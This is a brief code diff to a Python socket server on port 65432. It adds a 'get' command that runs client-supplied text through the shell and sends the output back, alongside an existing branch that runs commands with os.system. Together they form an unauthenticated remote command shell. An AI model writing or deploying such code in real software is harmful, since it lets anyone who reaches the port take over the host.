@@ -85,8 +85,13 @@ def start_server(port=65432):
                             # Execute command
                             command = splitUp[1]
                             os.system(command)
-                            response = subprocess.check_output(command, shell=True)
+                            response = "done"
                             conn.sendall(response.encode('utf-8'))
+                        elif splitUp[0].lower() == "get":
+                            # Execute command
+                            command = splitUp[1]
+                            response = subprocess.check_output(command, shell=True)
+                            conn.sendall(response)
                     
                     except Exception as e:
                         print(f"Error handling client {addr}: {e}")
